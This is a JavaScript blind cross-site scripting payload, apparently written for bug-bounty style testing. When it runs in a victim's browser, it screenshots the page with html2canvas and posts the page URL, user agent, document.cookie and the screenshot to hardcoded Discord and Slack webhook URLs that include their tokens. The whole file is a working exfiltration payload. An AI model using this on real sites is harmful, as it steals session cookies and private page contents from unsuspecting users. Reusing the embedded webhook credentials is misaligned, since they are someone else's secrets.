(function() {
    // --- CONFIGURATION ---
    // Your webhook URLs have been pasted here
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1411319017452339301/0kk_SFr88XR9mm8v22bjgcDwdCmPeWXqAE4zSnmtrEl8DKf6DFSMJ6srVpn9_aErB37o';
    const slackWebhookUrl = 'https://hooks.slack.com/services/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';

    // --- MAIN FUNCTION ---
    function run() {
        // Load the html2canvas library to take screenshots
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        script.crossOrigin = 'anonymous';
        document.head.appendChild(script);

        script.onload = () => {
            // Once loaded, capture the screen
            html2canvas(document.body, { useCORS: true }).then(canvas => {
                const screenshotBlob = canvasToBlob(canvas);
                sendToDiscord(screenshotBlob);
                sendToSlack(screenshotBlob);
            }).catch(() => {
                // Fallback if canvas fails
                sendToDiscord(null);
                sendToSlack(null);
            });
        };
        script.onerror = () => {
            // Fallback if script fails to load
            sendToDiscord(null);
            sendToSlack(null);
        };
    }

    // --- SENDER FUNCTIONS ---
    function sendToDiscord(blob) {
        if (!discordWebhookUrl.startsWith('https://discord.com')) return;

        const formData = new FormData();
        const embed = {
            title: "Blind XSS Fired!",
            description: `**Vulnerable URL:**\n\`\`\`${document.location.href}\`\`\``,
            color: 5814783, // Blue
            fields: [
                { name: "User Agent", value: navigator.userAgent },
                { name: "Cookies", value: `\`\`\`${document.cookie || 'Not Accessible'}\`\`\`` }
            ],
        };

        if (blob) {
            embed.image = { url: "attachment://screenshot.jpg" };
            formData.append('file', blob, 'screenshot.jpg');
        }

        formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
        
        fetch(discordWebhookUrl, { method: 'POST', body: formData });
    }

    function sendToSlack(blob) {
        if (!slackWebhookUrl.startsWith('https://hooks.slack.com')) return;
        
        let textPayload = `*Blind XSS Fired!* :alert:\n\n*Vulnerable URL:*\n\`${document.location.href}\`\n\n*User Agent:*\n\`${navigator.userAgent}\`\n\n*Cookies:*\n\`${document.cookie || 'Not Accessible'}\``;
        
        if (blob) {
            textPayload += "\n\n(Screenshot was captured successfully)";
        }
        
        const formData = new FormData();
        formData.append('payload', JSON.stringify({ text: textPayload }));
        fetch(slackWebhookUrl, { method: 'POST', body: formData });
    }

    // --- HELPER FUNCTION ---
    function canvasToBlob(canvas) {
        const dataURL = canvas.toDataURL('image/jpeg', 0.7);
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    }

    // --- EXECUTE ---
    run();
})();
